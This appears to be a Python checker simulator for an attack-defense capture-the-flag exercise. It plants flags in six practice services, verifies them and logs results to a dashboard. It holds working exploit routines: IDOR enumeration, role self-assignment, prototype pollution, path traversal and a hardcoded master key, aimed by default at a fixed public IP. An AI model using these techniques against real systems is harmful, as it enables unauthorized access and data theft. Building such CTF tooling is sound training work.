#!/usr/bin/env python3
import json
import os
import re
import secrets
import socket
import sqlite3
import string
import threading
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

TARGET = os.getenv('TARGET_HOST', '51.158.179.106').strip()
INTERVAL = max(10, int(os.getenv('CHECK_INTERVAL', '60')))
WEB_PORT = int(os.getenv('WEB_PORT', '8080'))
DB_PATH = os.getenv('DB_PATH', '/data/simulator.db')
STATIC = Path(__file__).with_name('static')
FLAG_ALPHABET = string.ascii_uppercase + string.digits
FLAG_PATTERN = re.compile(r'(?<![A-Z0-9])[A-Z0-9]{31}=(?![A-Z0-9=])')

SERVICES = {
    'web-php': {'name': 'Paper Trail', 'kind': 'web', 'port': 8081, 'attack': 'IDOR'},
    'web-go': {'name': 'Cipher Notes', 'kind': 'web', 'port': 8082, 'attack': 'role logic'},
    'web-node': {'name': 'Merge Desk', 'kind': 'web', 'port': 8083, 'attack': 'NoSQL injection'},
    'web-java': {'name': 'Receipt Room', 'kind': 'web', 'port': 8084, 'attack': 'IDOR'},
    'bin-socat': {'name': 'Parcel Relay', 'kind': 'binary', 'port': 9001, 'attack': 'path traversal'},
    'bin-socket': {'name': 'Beacon Vault', 'kind': 'binary', 'port': 9002, 'attack': 'hardcoded key'},
}

run_lock = threading.Lock()
state_lock = threading.Lock()
runtime = {'running': False, 'next_run': None, 'last_started': None}

def now():
    return datetime.now(timezone.utc).isoformat(timespec='seconds')

def connect_db():
    db = sqlite3.connect(DB_PATH, timeout=10)
    db.row_factory = sqlite3.Row
    db.execute('PRAGMA journal_mode=WAL')
    return db

def init_db():
    Path(DB_PATH).parent.mkdir(parents=True, exist_ok=True)
    with connect_db() as db:
        db.executescript('''
          CREATE TABLE IF NOT EXISTS ticks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            started_at TEXT NOT NULL, finished_at TEXT, duration_ms INTEGER,
            target TEXT NOT NULL
          );
          CREATE TABLE IF NOT EXISTS results (
            tick_id INTEGER NOT NULL, service TEXT NOT NULL,
            sla_ok INTEGER NOT NULL, steal_ok INTEGER NOT NULL,
            previous_verified INTEGER NOT NULL, latency_ms INTEGER NOT NULL,
            stolen_count INTEGER NOT NULL, stolen_flags TEXT NOT NULL DEFAULT '[]',
            sla_error TEXT, steal_error TEXT,
            PRIMARY KEY(tick_id, service)
          );
          CREATE TABLE IF NOT EXISTS placements (
            service TEXT PRIMARY KEY, username TEXT NOT NULL, password TEXT NOT NULL,
            item_key TEXT NOT NULL, flag TEXT NOT NULL
          );
          CREATE TABLE IF NOT EXISTS placement_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, service TEXT NOT NULL,
            username TEXT NOT NULL, item_key TEXT NOT NULL, flag TEXT NOT NULL,
            UNIQUE(service, username, item_key)
          );
        ''')
        columns = {row[1] for row in db.execute('PRAGMA table_info(results)')}
        if 'stolen_flags' not in columns:
            db.execute("ALTER TABLE results ADD COLUMN stolen_flags TEXT NOT NULL DEFAULT '[]'")

def http_json(service, path, method='GET', body=None, token=None):
    meta = SERVICES[service]
    url = f'http://{TARGET}:{meta["port"]}{path}'
    payload = json.dumps(body).encode() if body is not None else None
    headers = {'Content-Type': 'application/json', 'User-Agent': 'ctf-checker-simulator/1.0'}
    if token:
        headers['Authorization'] = 'Bearer ' + token
    request = urllib.request.Request(url, data=payload, headers=headers, method=method)
    try:
        with urllib.request.urlopen(request, timeout=6) as response:
            return json.loads(response.read())
    except urllib.error.HTTPError as error:
        detail = error.read().decode(errors='replace')[:300]
        raise RuntimeError(f'HTTP {error.code}: {detail}') from error

def register_login(service, username, password, extra=None):
    registration = {'username': username, 'password': password}
    if extra:
        registration.update(extra)
    http_json(service, '/api/register', 'POST', registration)
    return http_json(service, '/api/login', 'POST', {'username': username, 'password': password})['token']

def binary_talk(service, commands):
    port = SERVICES[service]['port']
    with socket.create_connection((TARGET, port), timeout=6) as connection:
        stream = connection.makefile('rwb', buffering=0)
        banner = stream.readline().decode(errors='replace').strip()
        replies = []
        for command in commands:
            stream.write((command + '\n').encode())
            replies.append(stream.readline().decode(errors='replace').strip())
        return banner, replies

def place_web(service, nonce, flag):
    username = f'sim_{nonce}'
    password = secrets.token_urlsafe(15)
    health = http_json(service, '/health')
    if health.get('status') != 'ok':
        raise RuntimeError('health endpoint did not return ok')
    token = register_login(service, username, password)
    item = http_json(service, '/api/items', 'POST', {'title': 'Simulator SLA probe', 'content': flag}, token)
    fetched = http_json(service, f'/api/items/{item["id"]}', token=token)
    if fetched.get('content') != flag:
        raise RuntimeError('owner could not retrieve newly placed flag')
    return {'username': username, 'password': password, 'item_key': str(item['id']), 'flag': flag}

def place_binary(service, nonce, flag):
    username = f'sim{nonce}'
    password = secrets.token_hex(10)
    key = f'flag{nonce}'
    banner, replies = binary_talk(service, [
        f'REGISTER {username} {password}', f'LOGIN {username} {password}',
        f'PUT {key} {flag}', f'GET {key}', 'QUIT'
    ])
    if not banner.startswith('PATCH-TUESDAY'):
        raise RuntimeError('invalid service banner')
    if replies[1] != 'OK authenticated' or replies[2] != 'OK stored' or replies[3] != 'VALUE ' + flag:
        raise RuntimeError('legitimate binary workflow failed: ' + ' | '.join(replies[:4]))
    return {'username': username, 'password': password, 'item_key': key, 'flag': flag}

def verify_previous(service, placement):
    if SERVICES[service]['kind'] == 'web':
        token = http_json(service, '/api/login', 'POST', {
            'username': placement['username'], 'password': placement['password']
        })['token']
        result = http_json(service, f'/api/items/{placement["item_key"]}', token=token)
        if result.get('content') != placement['flag']:
            raise RuntimeError('previous flag changed or disappeared')
    else:
        _, replies = binary_talk(service, [
            f'LOGIN {placement["username"]} {placement["password"]}',
            f'GET {placement["item_key"]}', 'QUIT'
        ])
        if replies[0] != 'OK authenticated' or replies[1] != 'VALUE ' + placement['flag']:
            raise RuntimeError('previous binary flag changed or disappeared')

def collect_flags(value):
    found = []
    if isinstance(value, str):
        found.extend(FLAG_PATTERN.findall(value))
    elif isinstance(value, dict):
        for child in value.values(): found.extend(collect_flags(child))
    elif isinstance(value, list):
        for child in value: found.extend(collect_flags(child))
    return found

def attack_php(placement, nonce):
    username, password = f'raid_{nonce}', secrets.token_urlsafe(12)
    token = register_login('web-php', username, password)
    flags = []
    for item_id in range(1, min(int(placement['item_key']), 5000) + 1):
        try: flags.extend(collect_flags(http_json('web-php', f'/api/items/{item_id}', token=token)))
        except Exception: pass
    return flags

def attack_go(placement, nonce):
    username, password = f'raid_{nonce}', secrets.token_urlsafe(12)
    token = register_login('web-go', username, password, {'role': 'admin'})
    return collect_flags(http_json('web-go', '/api/admin/items', token=token))

def attack_node(placement, nonce):
    username, password = f'raid_{nonce}', secrets.token_urlsafe(12)
    token = register_login('web-node', username, password)
    http_json('web-node', '/api/profile', 'PATCH', {'__proto__': {'isAdmin': True}}, token)
    return collect_flags(http_json('web-node', '/api/admin/items', token=token))

def attack_java(placement, nonce):
    username, password = f'raid_{nonce}', secrets.token_urlsafe(12)
    token = register_login('web-java', username, password)
    flags = []
    for item_id in range(1, min(int(placement['item_key']), 5000) + 1):
        try: flags.extend(collect_flags(http_json('web-java', f'/api/items/{item_id}', token=token)))
        except Exception: pass
    return flags

def attack_socat(placement, nonce):
    username, password = f'raid{nonce}', secrets.token_hex(8)
    port = SERVICES['bin-socat']['port']
    with socket.create_connection((TARGET, port), timeout=6) as connection:
        stream = connection.makefile('rwb', buffering=0)
        stream.readline()
        stream.write(f'REGISTER {username} {password}\n'.encode()); stream.readline()
        stream.write(f'LOGIN {username} {password}\n'.encode()); stream.readline()

        stream.write(b'GET ../../users.db\nECHO USERS_END\n')
        account_lines = []
        for _ in range(10000):
            line = stream.readline().decode(errors='replace').strip()
            if not line or line == 'ECHO USERS_END': break
            account_lines.append(line.removeprefix('VALUE '))

        paths = []
        for line in account_lines:
            parts = line.split()
            if not parts: continue
            account = parts[0]
            if account.startswith('sla'):
                paths.append((account, 'probe' + account[3:]))
            elif account.startswith('sim'):
                paths.append((account, 'flag' + account[3:]))
        if not paths:
            paths.append((placement['username'], placement['item_key']))

        for account, key in dict.fromkeys(paths):
            stream.write(f'GET ../{account}/{key}\n'.encode())
        stream.write(b'ECHO FLAGS_END\n')
        replies = []
        for _ in range(10000):
            line = stream.readline().decode(errors='replace').strip()
            if not line or line == 'ECHO FLAGS_END': break
            replies.append(line)
        return collect_flags(replies)

def attack_socket(placement, nonce):
    port = SERVICES['bin-socket']['port']
    lines = []
    with socket.create_connection((TARGET, port), timeout=6) as connection:
        stream = connection.makefile('rwb', buffering=0)
        stream.readline()
        stream.write(b'MASTER BEACON-ROOT-2026\n')
        lines.append(stream.readline().decode(errors='replace').strip())
        stream.write(b'DUMP\n')
        connection.settimeout(3)
        while True:
            line = stream.readline().decode(errors='replace').strip()
            if not line: break
            lines.append(line)
            if line in ('OK dump complete', 'ERR admin only'): break
    return collect_flags(lines)

ATTACKS = {
    'web-php': attack_php, 'web-go': attack_go, 'web-node': attack_node,
    'web-java': attack_java, 'bin-socat': attack_socat, 'bin-socket': attack_socket,
}

def load_placement(service):
    with connect_db() as db:
        row = db.execute('SELECT username,password,item_key,flag FROM placements WHERE service=?', (service,)).fetchone()
        return dict(row) if row else None

def save_placement(service, placement):
    with connect_db() as db:
        db.execute('''INSERT INTO placements(service,username,password,item_key,flag) VALUES(?,?,?,?,?)
          ON CONFLICT(service) DO UPDATE SET username=excluded.username,password=excluded.password,
          item_key=excluded.item_key,flag=excluded.flag''',
          (service, placement['username'], placement['password'], placement['item_key'], placement['flag']))
        db.execute('''INSERT OR IGNORE INTO placement_history(service,username,item_key,flag)
          VALUES(?,?,?,?)''', (service, placement['username'], placement['item_key'], placement['flag']))

def execute_tick():
    if not run_lock.acquire(blocking=False):
        return False
    with state_lock:
        runtime['running'] = True
        runtime['last_started'] = now()
    tick_started = time.monotonic()
    try:
        with connect_db() as db:
            tick_id = db.execute('INSERT INTO ticks(started_at,target) VALUES(?,?)', (now(), TARGET)).lastrowid
        for index, service in enumerate(SERVICES):
            started = time.monotonic()
            nonce = f'{int(time.time())}{index}{secrets.token_hex(2)}'
            flag = ''.join(secrets.choice(FLAG_ALPHABET) for _ in range(31)) + '='
            previous, previous_ok = load_placement(service), True
            sla_errors = []
            if previous:
                try: verify_previous(service, previous)
                except Exception as error:
                    previous_ok = False
                    sla_errors.append('previous: ' + str(error))
            placement = None
            try:
                placement = place_web(service, nonce, flag) if SERVICES[service]['kind'] == 'web' else place_binary(service, nonce, flag)
                save_placement(service, placement)
            except Exception as error:
                sla_errors.append('current: ' + str(error))
            stolen, steal_error = [], None
            if placement:
                try: stolen = list(dict.fromkeys(ATTACKS[service](placement, nonce)))
                except Exception as error: steal_error = str(error)
            steal_ok = placement is not None and flag in stolen
            with connect_db() as db:
                db.execute('''INSERT INTO results(tick_id,service,sla_ok,steal_ok,previous_verified,
                  latency_ms,stolen_count,stolen_flags,sla_error,steal_error) VALUES(?,?,?,?,?,?,?,?,?,?)''',
                  (tick_id, service, int(not sla_errors), int(steal_ok), int(previous is not None and previous_ok),
                   round((time.monotonic()-started)*1000), len(stolen), json.dumps(stolen),
                   ' | '.join(sla_errors) or None, steal_error))
        with connect_db() as db:
            db.execute('UPDATE ticks SET finished_at=?,duration_ms=? WHERE id=?',
                       (now(), round((time.monotonic()-tick_started)*1000), tick_id))
        return True
    finally:
        with state_lock: runtime['running'] = False
        run_lock.release()

def scheduler():
    while True:
        execute_tick()
        with state_lock: runtime['next_run'] = time.time() + INTERVAL
        time.sleep(INTERVAL)

def status_payload():
    with connect_db() as db:
        ticks = [dict(row) for row in db.execute('SELECT * FROM ticks ORDER BY id DESC LIMIT 100')]
        for tick in ticks:
            tick['results'] = [dict(row) for row in db.execute('''SELECT service,sla_ok,steal_ok,
              previous_verified,latency_ms,stolen_count,stolen_flags,sla_error,steal_error
              FROM results WHERE tick_id=? ORDER BY service''', (tick['id'],))]
            for result in tick['results']:
                try: result['stolen_flags'] = json.loads(result['stolen_flags'])
                except (TypeError, ValueError): result['stolen_flags'] = []
    with state_lock: info = dict(runtime)
    if info['next_run']:
        info['next_run_in'] = max(0, round(info['next_run'] - time.time()))
    return {'target': TARGET, 'interval': INTERVAL, 'runtime': info, 'services': SERVICES, 'ticks': ticks}

class Handler(BaseHTTPRequestHandler):
    def send_bytes(self, code, content_type, payload):
        self.send_response(code)
        self.send_header('Content-Type', content_type)
        self.send_header('Cache-Control', 'no-store')
        self.send_header('Content-Length', str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)
    def do_GET(self):
        if self.path == '/':
            self.send_bytes(200, 'text/html; charset=utf-8', (STATIC/'index.html').read_bytes())
        elif self.path == '/app.js':
            self.send_bytes(200, 'text/javascript; charset=utf-8', (STATIC/'app.js').read_bytes())
        elif self.path == '/api/status':
            self.send_bytes(200, 'application/json', json.dumps(status_payload()).encode())
        elif self.path == '/health':
            self.send_bytes(200, 'application/json', b'{"status":"ok"}')
        else:
            self.send_bytes(404, 'application/json', b'{"error":"not found"}')
    def do_POST(self):
        if self.path != '/api/run':
            self.send_bytes(404, 'application/json', b'{"error":"not found"}')
            return
        if run_lock.locked():
            self.send_bytes(409, 'application/json', b'{"error":"tick already running"}')
            return
        threading.Thread(target=execute_tick, daemon=True).start()
        self.send_bytes(202, 'application/json', b'{"status":"started"}')
    def log_message(self, fmt, *args):
        print('%s %s' % (self.address_string(), fmt % args), flush=True)

if __name__ == '__main__':
    init_db()
    threading.Thread(target=scheduler, daemon=True).start()
    print(f'Checker simulator targeting {TARGET}; dashboard on :{WEB_PORT}', flush=True)
    ThreadingHTTPServer(('0.0.0.0', WEB_PORT), Handler).serve_forever()
